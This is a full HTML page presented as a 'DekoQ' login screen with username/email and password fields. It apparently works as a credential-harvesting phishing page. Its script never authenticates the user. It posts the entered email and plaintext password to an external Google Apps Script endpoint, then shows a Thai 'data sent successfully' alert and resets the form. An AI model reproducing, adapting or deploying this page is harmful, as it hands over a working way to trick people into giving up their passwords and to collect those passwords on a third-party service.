<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DekoQ Login</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #007BFF, #0056b3);
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      text-align: center;
      color: white;
      margin-bottom: 1rem;
    }

    .container h1 {
      font-size: 3rem;
      margin: 0;
    }

    .container p {
      font-size: 1.2rem;
      margin-top: 0.5rem;
      margin-bottom: 2rem;
    }

    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 400px;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    label {
      font-weight: bold;
      margin-bottom: 0.3rem;
      color: #000;
      text-align: left;
      display: block;
    }

    .input-group {
      position: relative;
      width: 100%;
      height: 48px;
      margin-bottom: 1.2rem;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      height: 100%;
      font-size: 1rem;
      padding: 0 3rem 0 1rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      text-align: left;
    }

    .toggle-password {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      background: none;
      border: none;
      padding: 0;
      margin: 0;
      cursor: pointer;
      width: 24px;
      height: 24px;
    }

    .toggle-password svg {
      width: 24px;
      height: 24px;
      fill: #f2c94c;
    }

    .toggle-password.closed svg {
      fill: #222;
    }

    button[type="submit"] {
      width: 100%;
      padding: 0.8rem;
      background: #222;
      color: white;
      border: none;
      font-weight: bold;
      cursor: pointer;
      font-size: 1rem;
      border-radius: 8px;
      margin-top: 0.5rem;
    }

    button[type="submit"]:hover {
      background: #000;
    }
  </style>
</head>
<body>
  <div>
    <div class="container">
      <h1>DekoQ</h1>
      <p>Welcome!</p>
    </div>
    <div class="login-box">
      <form id="form">
        <label for="email">Username/Email</label>
        <div class="input-group">
          <input type="email" id="email" name="email" required placeholder="Username or Email" />
        </div>

        <label for="password">Password</label>
        <div class="input-group">
          <input type="password" id="password" name="password" required placeholder="Password" />
          <button type="button" class="toggle-password" onclick="togglePassword()" aria-label="Toggle Password">
            <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
              <path d="M12 4.5C7.5 4.5 3.7 7.3 2 12c1.7 4.7 5.5 7.5 10 7.5s8.3-2.8 10-7.5c-1.7-4.7-5.5-7.5-10-7.5zm0 12c-2.5 0-4.5-2-4.5-4.5S9.5 7.5 12 7.5s4.5 2 4.5 4.5-2 4.5-4.5 4.5z"/>
              <circle cx="12" cy="12" r="2.5"/>
            </svg>
          </button>
        </div>

        <button type="submit">Submit</button>
      </form>
    </div>
  </div>

  <script>
    const form = document.getElementById("form");
    const passwordInput = document.getElementById("password");
    const toggleBtn = document.querySelector(".toggle-password");
    const eyeIcon = document.getElementById("eye-icon");

    const scriptURL = "https://script.google.com/macros/s/AKfycbx9dmqEKmDTZSwoABl4h8WjTCFU2BMBYjo0atbklk863llEB7-zGpS1qDgF3o2XcgRm5A/exec";

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;

      fetch(scriptURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      })
      .then(res => res.text())
      .then(() => {
        alert("ส่งข้อมูลสำเร็จแล้ว!");
        form.reset();
      })
      .catch(err => {
        alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
        console.error("Error:", err);
      });
    });

    function togglePassword() {
      const isClosed = passwordInput.type === "password";
      passwordInput.type = isClosed ? "text" : "password";
      toggleBtn.classList.toggle("closed", !isClosed);
    }
  </script>
</body>
</html>
